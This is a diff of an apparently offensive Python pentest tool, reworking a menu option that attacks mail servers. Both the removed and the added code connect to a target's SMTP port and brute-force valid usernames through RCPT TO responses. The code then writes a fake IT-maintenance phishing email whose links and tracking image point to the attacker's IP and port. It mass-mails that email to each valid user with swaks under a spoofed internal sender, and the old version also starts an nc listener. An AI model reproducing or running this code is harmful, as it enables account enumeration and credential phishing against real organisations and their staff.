@@ -3105,104 +3105,99 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='75':
-      checkParams = test_TIP()      
-      if checkParams != 1:
-         checkParams = test_DOM()         
-      if checkParams != 1:
-         checkParams = test_PRT("25")         
-      if checkParams != 1:
-         checkParams = getPort()                 
+      if HTTP != 0:
+         checkParams = test_TIP()      
          if checkParams != 1:
-            print(colored("[*] Attempting to connect to remote SMTP socket...", colour3))
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            try:
-               connect = s.connect((TIP.rstrip(" "),25))
-               print("[+] Succesfully connected to " + TIP.rstrip(" ") + ":25...\n")
-            except:
-               print("[+] Unable to connect to " + TIP.rstrip(" ") + ":25...\n")
-               prompt()
-               break
-            bannerResponce = s.recv(1024)
-            print(colored(bannerResponce, colour6))                     
-            print("\n[+] Saying hello...\n")
-            if "ESMTP" in str(bannerResponce):
-               string = "EHLO Rogue.Agent\r\n"
-            else:
-               string = "HELO Rogue.Agent\r\n"
-            s.send(bytes(string.encode()))
-            helloResponce = s.recv(1024)
-            print(colored(helloResponce, colour6))            
-            print("\n[+] Specifying my email address...\n")
-            string = "MAIL FROM:<root@kali.domain>\r\n"
-            s.send(bytes(string.encode()))
-            mailResponce = s.recv(1024)
-            print(colored(mailResponce, colour6))               
-            print("\n[+] Specifying recipient email address " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + "...\n")
-            string = "RCPT TO:<" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + ">\r\n"
-            s.send(bytes(string.encode()))
-            rcptResponce = s.recv(1024)
-            print(colored(rcptResponce, colour6))            
-            print("\n[+] Asking for help...\n")            
-            string = "HELP\r\n"
-            s.send(bytes(string.encode()))
-            helpResponce = s.recv(1024)
-            print(colored(helpResponce, colour6))            
-            print(colored("\n[*] Attempting to bruteforce valid usernames...", colour3))
-            count = lineCount(dataDir + "/usernames.txt")
-            for x in range(0, count):
-               data = linecache.getline(dataDir + "/usernames.txt", x + 1)
-               string = "RCPT TO:<" + data.rstrip("\n") + "@" + DOM.rstrip(" ") + ">\r\n"
+            checkParams = test_DOM()         
+         if checkParams != 1:
+            checkParams = test_PRT("25")         
+         if checkParams != 1:
+            checkParams = getPort()                 
+            if checkParams != 1:
+               print(colored("[*] Attempting to connect to remote SMTP socket...", colour3))
+               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+               try:
+                  connect = s.connect((TIP.rstrip(" "),25))
+                  print("[+] Succesfully connected to " + TIP.rstrip(" ") + ":25...\n")
+               except:
+                  print("[+] Unable to connect to " + TIP.rstrip(" ") + ":25...\n")
+                  prompt()
+                  break 
+               bannerResponce = s.recv(1024)
+               print(colored(bannerResponce, colour6))                     
+               print("\n[+] Saying hello...\n")
+               if "ESMTP" in str(bannerResponce):
+                  string = "EHLO Rogue.Agent\r\n"
+               else:
+                  string = "HELO Rogue.Agent\r\n"
                s.send(bytes(string.encode()))
-               bruteCheck = s.recv(1024)
-               if "Invalid recipient" not in str(bruteCheck):
-                  localCOM("echo " + data.rstrip("\n") + " >> valid.tmp")                  
-            nullTest = linecache.getline("valid.tmp",1)
-            if nullTest != "":
-               print("[+] Valid usernames found...")
-               catsFile("valid.tmp")
-               check = 0
-            else:
-               print("[-] No valid usernames found...")
-               check = 1                  
-            print("[+] Saying goodbye...\n")            
-            string = "QUIT\r\n"
-            s.send(bytes(string.encode()))
-            quitResponce = s.recv(1024)
-            print(colored(quitResponce, colour6)) 
-            s.close()            
-            if check != 1:
-               print(colored("\n[*] Creating a corporate looking phishing email...", colour3))
-               localCOM('echo "Hello.\n" > body.tmp')
-               localCOM('echo "We just performed maintenance on our servers." >> body.tmp') 
-               localCOM('echo "Please verify if you can still access the login page:\n" >> body.tmp')
-               localCOM('echo "\t  <img src=\""' + localIP + ":" + checkParams + '"/img\">" >> body.tmp')
-               localCOM('echo "\t  Citrix http://"' + localIP + ":" + checkParams + '"/" >> body.tmp')
-               localCOM('echo "  <a href=\"http://"' + localIP + ":" + checkParams + '"\">click me.</a>" >> body.tmp')
-               localCOM('echo "\nRegards," >> body.tmp')
-
-               print(colored("\nSubject: Immediate action required", colour6))  
-               catsFile("body.tmp")                      
-               sender = input("[?] Please enter senders name only, defualt is it: ")
-               if sender == "":
-                  sender = "it"
-               localCOM('echo ' + sender + '@' + DOM.rstrip(" ") + ' >> body.tmp')               
-               print(colored("[*] Starting phishing server...", colour3))            
-               dispBanner("GONE PHISHING",0)               
-               localCOM("xdotool key Ctrl+Shift+T")
-               localCOM("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")            
-               localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")            
-               localCOM("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return")            
-               localCOM("xdotool key Ctrl+Tab")
-               print("[+] Phishing server started...")                        
-               print(colored("[*] Phishing the valid username list...", colour3))
-               with open("valid.tmp", "r") as list:
-                  for phish in list:
-                     phish = phish.rstrip("\n")
-                     phish = phish.strip(" ")
-                     phish = phish + "@"
-                     phish = phish + DOM.rstrip(" ")
-                     remotCOM("swaks --to " + phish + " --from " + sender + "@" + DOM.rstrip(" ") + " --header 'Subject: Immediate action required' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
-                     print("[+] Email exploit sent to " + phish + " from " + sender + "@" + DOM.rstrip(" ") + "...")
+               helloResponce = s.recv(1024)
+               print(colored(helloResponce, colour6))            
+               print("\n[+] Specifying my email address...\n")
+               string = "MAIL FROM:<root@kali.domain>\r\n"
+               s.send(bytes(string.encode()))
+               mailResponce = s.recv(1024)
+               print(colored(mailResponce, colour6))               
+               print("\n[+] Specifying recipient email address " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + "...\n")
+               string = "RCPT TO:<" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + ">\r\n"
+               s.send(bytes(string.encode()))
+               rcptResponce = s.recv(1024)
+               print(colored(rcptResponce, colour6))            
+               print("\n[+] Asking for help...\n")            
+               string = "HELP\r\n"
+               s.send(bytes(string.encode()))
+               helpResponce = s.recv(1024)
+               print(colored(helpResponce, colour6))            
+               print(colored("\n[*] Attempting to bruteforce valid usernames...", colour3))
+               count = lineCount(dataDir + "/usernames.txt")
+               for x in range(0, count):
+                  data = linecache.getline(dataDir + "/usernames.txt", x + 1)
+                  string = "RCPT TO:<" + data.rstrip("\n") + "@" + DOM.rstrip(" ") + ">\r\n"
+                  s.send(bytes(string.encode()))
+                  bruteCheck = s.recv(1024)
+                  if "Invalid recipient" not in str(bruteCheck):
+                     localCOM("echo " + data.rstrip("\n") + " >> valid.tmp")                  
+               nullTest = linecache.getline("valid.tmp",1)
+               if nullTest != "":
+                  print("[+] Valid usernames found...")
+                  catsFile("valid.tmp")
+                  check = 0
+               else:
+                  print("[-] No valid usernames found...")
+                  check = 1                  
+               print("[+] Saying goodbye...\n")            
+               string = "QUIT\r\n"
+               s.send(bytes(string.encode()))
+               quitResponce = s.recv(1024)
+               print(colored(quitResponce, colour6)) 
+               s.close()            
+               if check != 1:
+                  print(colored("\n[*] Creating a corporate looking phishing email...", colour3))
+                  localCOM('echo "Hello.\n" > body.tmp')
+                  localCOM('echo "We just performed maintenance on our servers." >> body.tmp') 
+                  localCOM('echo "Please verify if you can still access the login page:\n" >> body.tmp')
+                  localCOM('echo "\t  <img src=\""' + localIP + ":" + checkParams + '"/img\">" >> body.tmp')
+                  localCOM('echo "\t  Citrix http://"' + localIP + ":" + checkParams + '"/" >> body.tmp')
+                  localCOM('echo "  <a href=\"http://"' + localIP + ":" + checkParams + '"\">click me.</a>" >> body.tmp')
+                  localCOM('echo "\nRegards," >> body.tmp')
+                  if USR[:1] == "'":
+                     localCOM('echo it@' + DOM.rstrip(" ") + ' >> body.tmp')
+                     sender = "it"
+                  else:
+                     localCOM('echo ' + USR.rstrip(" ") + '@' + DOM.rstrip(" ") + ' >> body.tmp')
+                     sender = USR.rstrip(" ")
+                  catsFile("body.tmp")
+                  print(colored("[*] Phishing the valid username list...", colour3))
+                  with open("valid.tmp", "r") as list:
+                     for phish in list:
+                        phish = phish.rstrip("\n")
+                        phish = phish.strip(" ")
+                        phish = phish + "@"
+                        phish = phish + DOM.rstrip(" ")
+                        remotCOM("swaks --to " + phish + " --from " + sender + "@" + DOM.rstrip(" ") + " --header 'Subject: Immediate action required' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
+                        print("[+] Email exploit sent to " + phish + " from " + sender + "@" + DOM.rstrip(" ") + "...")
+      else:
+         print("[-] You need to start the smtpd server first...")
       prompt()      
       
 # ------------------------------------------------------------------------------------- 
